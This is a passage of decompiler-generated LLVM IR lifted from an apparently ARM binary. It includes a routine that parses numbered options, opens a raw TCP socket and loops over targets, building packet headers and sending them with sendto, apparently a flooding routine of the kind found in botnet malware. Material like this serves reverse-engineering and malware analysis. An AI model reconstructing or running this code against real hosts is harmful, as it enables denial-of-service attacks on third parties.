  %v2_cc04 = icmp eq i32 %v0_cc04, 0
  store i1 %v2_cc04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp95 = icmp slt i32 %v0_cc04, 1
  br label %dec_label_pc_cc0c

dec_label_pc_cc0c:                                ; preds = %dec_label_pc_cc0c, %dec_label_pc_cc04
  br i1 %tmp95, label %dec_label_pc_cc0c, label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cc0c
  %v0_cc10 = load i32, i32* @r7, align 4
  %tmp96 = mul i32 %v0_cc10, 256
  %v1_cc18 = and i32 %tmp96, 65280
  %tmp97 = udiv i32 %v0_cc10, 256
  %v4_cc1c = urem i32 %tmp97, 256
  %v5_cc1c = or i32 %v4_cc1c, %v1_cc18
  store i32 %v5_cc1c, i32* @r8, align 4
  store i32 %v2_c550, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c738, i32* %ip.global-to-local, align 4
  %v7_cc30 = load i32, i32* %v6_cc30, align 4
  store i32 %v7_cc30, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cc38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_cc44 = add i32 %v7_cc30, 20
  store i32 %v1_cc44, i32* @r5, align 4
  br i1 %v3_cc38, label %dec_label_pc_cd6c, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cd4c, %dec_label_pc_cc10
  %v0_cc58 = phi i32 [ %v7_cd58, %dec_label_pc_cd4c ], [ %v7_cc30, %dec_label_pc_cc10 ]
  store i1 %v2_cd7c, i1* %cpsr_z.global-to-local, align 1
  %v0_cc54 = load i32, i32* @sb, align 4
  store i32 %v0_cc54, i32* @r1, align 4
  %v1_cc58 = add i32 %v0_cc58, 40
  store i32 %v1_cc58, i32* %r0.global-to-local, align 4
  br i1 %v2_cd7c, label %dec_label_pc_cc60, label %dec_label_pc_cd90

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_cd6c, %dec_label_pc_cd90
  %v2_cc60 = phi i32 [ %v0_cc58, %dec_label_pc_cc4c ], [ %v0_cd84, %dec_label_pc_cd6c ], [ %v2_cc60.pre, %dec_label_pc_cd90 ]
  %v0_cc60 = load i32, i32* @r6, align 4
  %v1_cc60 = trunc i32 %v0_cc60 to i8
  %v3_cc60 = add i32 %v2_cc60, 10
  %v4_cc60 = inttoptr i32 %v3_cc60 to i8*
  store i8 %v1_cc60, i8* %v4_cc60, align 1
  %v0_cc64 = load i32, i32* @r6, align 4
  %v1_cc64 = trunc i32 %v0_cc64 to i8
  %v2_cc64 = load i32, i32* @r4, align 4
  %v3_cc64 = add i32 %v2_cc64, 11
  %v4_cc64 = inttoptr i32 %v3_cc64 to i8*
  store i8 %v1_cc64, i8* %v4_cc64, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cc6c = load i32, i32* @r4, align 4
  store i32 %v0_cc6c, i32* @r0, align 4
  %v2_cc70 = call i32 @function_fda0(i32 %v0_cc6c, i32 20)
  %v3_cc70 = trunc i32 %v2_cc70 to i8
  store i32 %v2_cc70, i32* %r0.global-to-local, align 4
  %v3_cc74 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_c540, i32* %r2.global-to-local, align 4
  %v3_cc7c = mul i32 %v3_cc74, 16
  %v2_cc80 = add i32 %v3_cc7c, %v2_c540
  store i32 %v2_cc80, i32* %r1.global-to-local, align 4
  %v1_cc84 = add i32 %v2_cc80, 4
  %v2_cc84 = inttoptr i32 %v1_cc84 to i32*
  %v3_cc84 = load i32, i32* %v2_cc84, align 4
  %v3_cc88 = mul i32 %v3_cc84, 65536
  store i32 %v3_cc88, i32* %ip.global-to-local, align 4
  %tmp98 = mul i32 %v3_cc84, 256
  %v1_cc90 = and i32 %tmp98, 65280
  %tmp99 = udiv i32 %v3_cc84, 256
  %v4_cc94 = urem i32 %tmp99, 256
  %v5_cc94 = or i32 %v4_cc94, %v1_cc90
  store i32 %v5_cc94, i32* %r2.global-to-local, align 4
  %v1_cc98 = add i32 %v3_cc84, 1
  store i32 %v1_cc98, i32* %r3.global-to-local, align 4
  store i32 %v1_cc98, i32* %v2_cc84, align 4
  %v0_cca0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cca0 = load i32, i32* @r5, align 4
  %v2_cca0 = add i32 %v1_cca0, 4
  %v3_cca0 = inttoptr i32 %v2_cca0 to i32*
  store i32 %v0_cca0, i32* %v3_cca0, align 4
  %v0_cca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cca4 = add i32 %v0_cca4, 8
  %v2_cca4 = inttoptr i32 %v1_cca4 to i32*
  %v3_cca4 = load i32, i32* %v2_cca4, align 4
  %tmp100 = mul i32 %v3_cca4, 256
  %v1_ccb0 = and i32 %tmp100, 65280
  %tmp101 = udiv i32 %v3_cca4, 256
  %v4_ccb4 = urem i32 %tmp101, 256
  %v5_ccb4 = or i32 %v4_ccb4, %v1_ccb0
  store i32 %v5_ccb4, i32* %r2.global-to-local, align 4
  %v4_ccb837 = udiv i32 %v2_cc70, 256
  %v1_ccbc = trunc i32 %v4_ccb837 to i8
  %v2_ccbc = load i32, i32* @r4, align 4
  %v3_ccbc = add i32 %v2_ccbc, 11
  %v4_ccbc = inttoptr i32 %v3_ccbc to i8*
  store i8 %v1_ccbc, i8* %v4_ccbc, align 1
  %v3_ccc0 = load i32, i32* @r4, align 4
  %v4_ccc0 = add i32 %v3_ccc0, 10
  %v5_ccc0 = inttoptr i32 %v4_ccc0 to i8*
  store i8 %v3_cc70, i8* %v5_ccc0, align 1
  %v0_ccc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccc4 = load i32, i32* @r5, align 4
  %v2_ccc4 = add i32 %v1_ccc4, 8
  %v3_ccc4 = inttoptr i32 %v2_ccc4 to i32*
  store i32 %v0_ccc4, i32* %v3_ccc4, align 4
  %v0_ccc8 = load i32, i32* @r5, align 4
  store i32 %v0_ccc8, i32* @r1, align 4
  %v0_cccc = load i32, i32* @r8, align 4
  store i32 %v0_cccc, i32* %r2.global-to-local, align 4
  %v0_ccd0 = load i32, i32* @r7, align 4
  store i32 %v0_ccd0, i32* %r3.global-to-local, align 4
  %v0_ccd4 = load i32, i32* @r4, align 4
  store i32 %v0_ccd4, i32* %r0.global-to-local, align 4
  %v0_ccd8 = load i32, i32* @r6, align 4
  %v1_ccd8 = trunc i32 %v0_ccd8 to i8
  %v3_ccd8 = add i32 %v0_ccc8, 16
  %v4_ccd8 = inttoptr i32 %v3_ccd8 to i8*
  store i8 %v1_ccd8, i8* %v4_ccd8, align 1
  %v0_ccdc = load i32, i32* @r6, align 4
  %v1_ccdc = trunc i32 %v0_ccdc to i8
  %v2_ccdc = load i32, i32* @r5, align 4
  %v3_ccdc = add i32 %v2_ccdc, 17
  %v4_ccdc = inttoptr i32 %v3_ccdc to i8*
  store i8 %v1_ccdc, i8* %v4_ccdc, align 1
  %v4_cce0 = call i32 @function_fdfc(i32 %v0_ccd4, i32 %v0_ccc8, i32 %v0_cccc, i32 %v0_ccd0)
  %v5_cce0 = trunc i32 %v4_cce0 to i8
  store i32 %v4_cce0, i32* %r0.global-to-local, align 4
  %v4_cce438 = udiv i32 %v4_cce0, 256
  %v1_cce8 = trunc i32 %v4_cce438 to i8
  %v2_cce8 = load i32, i32* @r5, align 4
  %v3_cce8 = add i32 %v2_cce8, 17
  %v4_cce8 = inttoptr i32 %v3_cce8 to i8*
  store i8 %v1_cce8, i8* %v4_cce8, align 1
  %v3_ccec = load i32, i32* @r5, align 4
  %v4_ccec = add i32 %v3_ccec, 16
  %v5_ccec = inttoptr i32 %v4_ccec to i8*
  store i8 %v5_cce0, i8* %v5_ccec, align 1
  %v3_ccf0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccf0, i32* %r3.global-to-local, align 4
  %v0_ccf4 = load i32, i32* @r4, align 4
  %v1_ccf4 = add i32 %v0_ccf4, 20
  %v2_ccf4 = inttoptr i32 %v1_ccf4 to i32*
  %v3_ccf4 = load i32, i32* %v2_ccf4, align 4
  %v5_ccfc = mul i32 %v3_ccf0, 24
  %v3_cd04 = udiv i32 %v3_ccf4, 65536
  store i32 %v3_cd04, i32* %r2.global-to-local, align 4
  %v2_cd08 = add i32 %v5_ccfc, %arg2
  store i32 %v2_cd08, i32* %ip.global-to-local, align 4
  %v3_cd0c6 = udiv i32 %v3_ccf4, 16777216
  %v1_cd10 = trunc i32 %v3_cd0c6 to i8
  %v3_cd10 = add i32 %v2_cd08, 3
  %v4_cd10 = inttoptr i32 %v3_cd10 to i8*
  store i8 %v1_cd10, i8* %v4_cd10, align 1
  %v0_cd14 = load i32, i32* %r2.global-to-local, align 4
  %v1_cd14 = trunc i32 %v0_cd14 to i8
  %v2_cd14 = load i32, i32* %ip.global-to-local, align 4
  %v3_cd14 = add i32 %v2_cd14, 2
  %v4_cd14 = inttoptr i32 %v3_cd14 to i8*
  store i8 %v1_cd14, i8* %v4_cd14, align 1
  %v0_cd18 = load i32, i32* @r4, align 4
  store i32 %v0_cd18, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c6f0, i32* %r0.global-to-local, align 4
  %v0_cd24 = load i32, i32* @sl, align 4
  store i32 %v0_cd24, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_cd2c = load i32, i32* %ip.global-to-local, align 4
  %v6_cd34 = call i32 @_sendto(i32 %v3_c6f0, i32 %v0_cd18, i32 %v0_cd24, i32 16384, i32 %v0_cd2c, i32 16)
  %v3_cd38 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cd38, i32* %r3.global-to-local, align 4
  %v1_cd3c = add i32 %v3_cd38, 1
  store i32 %v1_cd3c, i32* %r0.global-to-local, align 4
  %v1_cd40 = load i32, i32* @fp, align 4
  %v9_cd40 = icmp eq i32 %v1_cd3c, %v1_cd40
  store i1 %v9_cd40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cd3c, i32* %stack_var_-40, align 4
  %v6_cd48 = icmp slt i32 %v1_cd3c, %v1_cd40
  br i1 %v6_cd48, label %dec_label_pc_cd4c, label %dec_label_pc_cc04

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cc60
  store i32 %v2_c550, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c738, i32* %ip.global-to-local, align 4
  %v4_cd58 = mul i32 %v1_cd3c, 4
  %v5_cd58 = add i32 %v4_cd58, %v2_c550
  %v6_cd58 = inttoptr i32 %v5_cd58 to i32*
  %v7_cd58 = load i32, i32* %v6_cd58, align 4
  store i32 %v7_cd58, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cc38, i1* %cpsr_z.global-to-local, align 1
  %v1_cd64 = add i32 %v7_cd58, 20
  store i32 %v1_cd64, i32* @r5, align 4
  br i1 %v3_cc38, label %dec_label_pc_cd6c, label %dec_label_pc_cc4c

dec_label_pc_cd6c:                                ; preds = %dec_label_pc_cd4c, %dec_label_pc_cc10
  %v0_cd6c = call i32 @function_117dc()
  %v1_cd6c = trunc i32 %v0_cd6c to i8
  %v4_cd70 = sdiv i32 %v0_cd6c, 256
  store i32 %v4_cd70, i32* %r3.global-to-local, align 4
  %v3_cd74 = load i32, i32* @r4, align 4
  %v4_cd74 = add i32 %v3_cd74, 4
  %v5_cd74 = inttoptr i32 %v4_cd74 to i8*
  store i8 %v1_cd6c, i8* %v5_cd74, align 1
  store i1 %v2_cd7c, i1* %cpsr_z.global-to-local, align 1
  %v0_cd80 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd80 = trunc i32 %v0_cd80 to i8
  %v2_cd80 = load i32, i32* @r4, align 4
  %v3_cd80 = add i32 %v2_cd80, 5
  %v4_cd80 = inttoptr i32 %v3_cd80 to i8*
  store i8 %v1_cd80, i8* %v4_cd80, align 1
  %v0_cd84 = load i32, i32* @r4, align 4
  %v1_cd84 = add i32 %v0_cd84, 40
  store i32 %v1_cd84, i32* %r0.global-to-local, align 4
  %v0_cd88 = load i32, i32* @sb, align 4
  store i32 %v0_cd88, i32* @r1, align 4
  %v0_cd8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cd8c, label %dec_label_pc_cc60, label %dec_label_pc_cd90

dec_label_pc_cd90:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_cd6c
  %v0_cd90 = phi i32 [ %v1_cc58, %dec_label_pc_cc4c ], [ %v1_cd84, %dec_label_pc_cd6c ]
  %v1_cd90 = inttoptr i32 %v0_cd90 to i8*
  %v2_cd90 = call i32 @function_119b8(i8* %v1_cd90)
  store i32 %v2_cd90, i32* %r0.global-to-local, align 4
  %v2_cc60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc60

; uselistorder directives
  uselistorder i32 %v0_cd84, { 1, 0 }
  uselistorder i32 %v7_cd58, { 1, 2, 0 }
  uselistorder i32 %v1_cd40, { 1, 2, 0 }
  uselistorder i32 %v1_cd3c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_cce0, { 0, 2, 1 }
  uselistorder i32 %v0_ccc8, { 1, 0, 2 }
  uselistorder i32 %v3_cca4, { 1, 0 }
  uselistorder i32 %v3_cc84, { 3, 2, 0, 1 }
  uselistorder i32 %v2_cc70, { 0, 2, 1 }
  uselistorder i32 %v0_cc58, { 1, 0 }
  uselistorder i32 %v0_cc10, { 1, 0 }
  uselistorder i32 %v0_cc04, { 1, 0 }
  uselistorder i1 %v3_cc38, { 2, 3, 1, 0 }
  uselistorder i1 %v2_cd7c, { 2, 1, 0 }
  uselistorder i32 %v1_cbec, { 1, 0, 2, 3 }
  uselistorder i32 %v0_cb40, { 0, 2, 1 }
  uselistorder i32 %v3_cb20, { 1, 0 }
  uselistorder i32 %v0_caf4, { 1, 0, 2 }
  uselistorder i32 %v3_cae8, { 1, 0 }
  uselistorder i32 %v1_ca4c, { 1, 0 }
  uselistorder i32 %v0_ca40, { 1, 2, 0 }
  uselistorder i32 %v3_ca04, { 1, 0 }
  uselistorder i32 %v2_c9f0, { 1, 0 }
  uselistorder i32 %v3_c9d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c9cc, { 1, 0 }
  uselistorder i32 %v3_c9a8, { 1, 0, 2 }
  uselistorder i32 %v3_c9a0, { 1, 0 }
  uselistorder i32 %v4_c988, { 1, 0 }
  uselistorder i32 %v0_c984, { 0, 2, 1 }
  uselistorder i1 %v7_c8f4, { 1, 0 }
  uselistorder i32 %v6_c8ec, { 0, 2, 1, 3 }
  uselistorder i32 %v5_c938, { 1, 0 }
  uselistorder i1 %v9_c91c, { 1, 0 }
  uselistorder i32 %v4_c930, { 1, 0 }
  uselistorder i32 %v4_c92c, { 1, 0 }
  uselistorder i32 %storemerge34, { 0, 2, 1 }
  uselistorder i32 %v8_c824, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c810, { 1, 0 }
  uselistorder i32 %v7_c7dc, { 4, 1, 3, 0, 2, 5 }
  uselistorder i1 %v7_c788, { 1, 0 }
  uselistorder i32 %v3_c784, { 2, 1, 0, 3 }
  uselistorder i32 %v1_cbac, { 1, 0 }
  uselistorder i32 %v1_cb94, { 1, 0 }
  uselistorder i32 %v1_cb7c, { 1, 0 }
  uselistorder i32 %v1_cb64, { 1, 0 }
  uselistorder i32 %v1_cb4c, { 1, 0 }
  uselistorder i32 %v5_c934, { 1, 0 }
  uselistorder i32 %v3_c86c106, { 1, 0 }
  uselistorder i1 %v2_c94c, { 1, 0 }
  uselistorder i32 %v1_c948, { 1, 0 }
  uselistorder i32 %v4_c944, { 2, 0, 1 }
  uselistorder i32 %v4_c928, { 1, 0 }
  uselistorder i1 %v3_c854, { 1, 0 }
  uselistorder i32 %v1_c768, { 2, 1, 0 }
  uselistorder i32 %v8_c744, { 2, 1, 0 }
  uselistorder i32 %v8_c740, { 1, 2, 0 }
  uselistorder i32 %v3_c738, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c734, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c728, { 1, 0 }
  uselistorder i1 %v7_c6f8, { 1, 0 }
  uselistorder i32 %v3_c6f4, { 2, 3, 0, 1 }
  uselistorder i32 %v3_c6f0, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_c6e0, { 1, 0 }
  uselistorder i32 %v1_c688, { 1, 0 }
  uselistorder i32 %v1_c668, { 1, 0 }
  uselistorder i32 %v1_c648, { 1, 0 }
  uselistorder i32 %v1_c628, { 1, 0 }
  uselistorder i32 %v1_c608, { 1, 0 }
  uselistorder i32 %v1_c5d0, { 1, 0 }
  uselistorder i32 %v2_c550, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_c540, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_c524, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 27, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 20, 12, 13, 14, 15, 16, 17, 18, 19, 24, 21, 22, 23, 25, 27, 26, 29, 28, 32, 30, 33, 34, 31, 36, 35, 37, 38, 39, 41, 40, 42, 46, 43, 44, 45, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder label %dec_label_pc_cd90, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbe8, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %.thread9, { 2, 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_c97c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c8b4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c848, { 1, 0 }
}

define i32 @function_cd9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cd9c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_cd9c = load i32, i32* @r4, align 4
  %v1_cda0 = urem i32 %arg1, 256
  store i32 %v1_cda0, i32* @fp, align 4
  store i32 %v1_cda0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_cdb8 = urem i32 %arg3, 256
  store i32 %v1_cdb8, i32* @r4, align 4
  %v2_cdbc = call i32 @_calloc(i32 %v1_cda0, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_cdc8 = load i32, i32* @fp, align 4
  store i32 %v0_cdc8, i32* %r0.global-to-local, align 4
  %v2_cdcc = call i32 @_calloc(i32 %v0_cdc8, i32 4)
  %v0_cdd0 = load i32, i32* @r5, align 4
  store i32 %v0_cdd0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cde0 = load i32, i32* @r4, align 4
  store i32 %v0_cde0, i32* %r0.global-to-local, align 4
  %v5_cde4 = inttoptr i32 %v0_cdd0 to i32*
  %v6_cde4 = call i32 @function_b240(i32 %v0_cde0, i32* %v5_cde4, i32 2, i32 0)
  %v1_cdf0 = urem i32 %v6_cde4, 256
  store i32 %v1_cdf0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cdfc = load i32, i32* @r5, align 4
  store i32 %v0_cdfc, i32* %r1.global-to-local, align 4
  %v0_ce00 = load i32, i32* @r4, align 4
  store i32 %v0_ce00, i32* %r0.global-to-local, align 4
  %v6_ce08 = inttoptr i32 %v0_cdfc to i32*
  %v7_ce08 = call i32 @function_b240(i32 %v0_ce00, i32* %v6_ce08, i32 3, i32 65535)
  %v0_ce0c = load i32, i32* @r5, align 4
  store i32 %v0_ce0c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ce08, i32* @r6, align 4
  %v0_ce1c = load i32, i32* @r4, align 4
  store i32 %v0_ce1c, i32* %r0.global-to-local, align 4
  %v4_ce20 = inttoptr i32 %v0_ce0c to i32*
  %v5_ce20 = call i32 @function_b240(i32 %v0_ce1c, i32* %v4_ce20, i32 4, i32 64)
  %v1_ce28 = urem i32 %v5_ce20, 256
  store i32 %v1_ce28, i32* %ip.global-to-local, align 4
  %v0_ce2c = load i32, i32* @r5, align 4
  store i32 %v0_ce2c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ce38 = load i32, i32* @r4, align 4
  store i32 %v0_ce38, i32* %r0.global-to-local, align 4
  %v6_ce40 = inttoptr i32 %v0_ce2c to i32*
  %v7_ce40 = call i32 @function_b240(i32 %v0_ce38, i32* %v6_ce40, i32 5, i32 1)
  %v1_ce4c = urem i32 %v7_ce40, 256
  store i32 %v1_ce4c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ce54 = load i32, i32* @r5, align 4
  store i32 %v0_ce54, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ce5c = load i32, i32* @r4, align 4
  store i32 %v0_ce5c, i32* %r0.global-to-local, align 4
  %v5_ce64 = inttoptr i32 %v0_ce54 to i32*
  %v6_ce64 = call i32 @function_b240(i32 %v0_ce5c, i32* %v5_ce64, i32 7, i32 65535)
  %v0_ce68 = load i32, i32* @r5, align 4
  store i32 %v0_ce68, i32* %r1.global-to-local, align 4
  %v3_ce6c = mul i32 %v6_ce64, 65536
  store i32 %v3_ce6c, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ce78 = load i32, i32* @r4, align 4
  store i32 %v0_ce78, i32* %r0.global-to-local, align 4
  %v4_ce7c = inttoptr i32 %v0_ce68 to i32*
  %v5_ce7c = call i32 @function_b240(i32 %v0_ce78, i32* %v4_ce7c, i32 11, i32 1)
  %v1_ce84 = urem i32 %v5_ce7c, 256
  store i32 %v1_ce84, i32* %ip.global-to-local, align 4
  %v0_ce88 = load i32, i32* @r5, align 4
  store i32 %v0_ce88, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ce94 = load i32, i32* @r4, align 4
  store i32 %v0_ce94, i32* %r0.global-to-local, align 4
  %v5_ce9c = inttoptr i32 %v0_ce88 to i32*
  %v6_ce9c = call i32 @function_b240(i32 %v0_ce94, i32* %v5_ce9c, i32 12, i32 1)
  %v1_cea4 = urem i32 %v6_ce9c, 256
  store i32 %v1_cea4, i32* %ip.global-to-local, align 4
  %v0_cea8 = load i32, i32* @r5, align 4
  store i32 %v0_cea8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ceb4 = load i32, i32* @r4, align 4
  store i32 %v0_ceb4, i32* %r0.global-to-local, align 4
  %v5_cebc = inttoptr i32 %v0_cea8 to i32*
  %v6_cebc = call i32 @function_b240(i32 %v0_ceb4, i32* %v5_cebc, i32 13, i32 1)
  %v1_cec4 = urem i32 %v6_cebc, 256
  store i32 %v1_cec4, i32* %ip.global-to-local, align 4
  %v0_cec8 = load i32, i32* @r5, align 4
  store i32 %v0_cec8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ced4 = load i32, i32* @r4, align 4
  store i32 %v0_ced4, i32* %r0.global-to-local, align 4
  %v5_cedc = inttoptr i32 %v0_cec8 to i32*
  %v6_cedc = call i32 @function_b240(i32 %v0_ced4, i32* %v5_cedc, i32 14, i32 1)
  %v1_cee4 = urem i32 %v6_cedc, 256
  store i32 %v1_cee4, i32* %ip.global-to-local, align 4
  %v0_cee8 = load i32, i32* @r5, align 4
  store i32 %v0_cee8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cef4 = load i32, i32* @r4, align 4
  store i32 %v0_cef4, i32* %r0.global-to-local, align 4
  %v5_cefc = inttoptr i32 %v0_cee8 to i32*
  %v6_cefc = call i32 @function_b240(i32 %v0_cef4, i32* %v5_cefc, i32 15, i32 1)
  %v1_cf04 = urem i32 %v6_cefc, 256
  store i32 %v1_cf04, i32* %ip.global-to-local, align 4
  %v0_cf08 = load i32, i32* @r5, align 4
  store i32 %v0_cf08, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cf14 = load i32, i32* @r4, align 4
  store i32 %v0_cf14, i32* %r0.global-to-local, align 4
  %v5_cf1c = inttoptr i32 %v0_cf08 to i32*
  %v6_cf1c = call i32 @function_b240(i32 %v0_cf14, i32* %v5_cf1c, i32 16, i32 1)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_cf1c, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_cf2c = load i32, i32* @r5, align 4
  store i32 %v0_cf2c, i32* %r1.global-to-local, align 4
  %v0_cf30 = load i32, i32* @r4, align 4
  store i32 %v0_cf30, i32* %r0.global-to-local, align 4
  %v1_cf34 = urem i32 %v6_cf1c, 256
  store i32 %v1_cf34, i32* @r8, align 4
  %v4_cf38 = inttoptr i32 %v0_cf2c to i32*
  %v5_cf38 = call i32 @function_b240(i32 %v0_cf30, i32* %v4_cf38, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cf44 = load i32, i32* @r5, align 4
  store i32 %v0_cf44, i32* %r1.global-to-local, align 4
  store i32 %v5_cf38, i32* @sb, align 4
  %v0_cf4c = load i32, i32* @r4, align 4
  store i32 %v0_cf4c, i32* %r0.global-to-local, align 4
  %v4_cf50 = inttoptr i32 %v0_cf44 to i32*
  %v5_cf50 = call i32 @function_b240(i32 %v0_cf4c, i32* %v4_cf50, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_cf5c = urem i32 %v5_cf50, 256
  store i32 %v1_cf5c, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_cf6c = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_cf6c, i32* %r0.global-to-local, align 4
  %v0_cf70 = load i32, i32* @r7, align 4
  %v3_cf70 = udiv i32 %v0_cf70, 65536
  store i32 %v3_cf70, i32* %r1.global-to-local, align 4
  %v7_cf74 = icmp eq i32 %v3_cf6c, -1
  store i1 %v7_cf74, i1* %cpsr_z.global-to-local, align 1
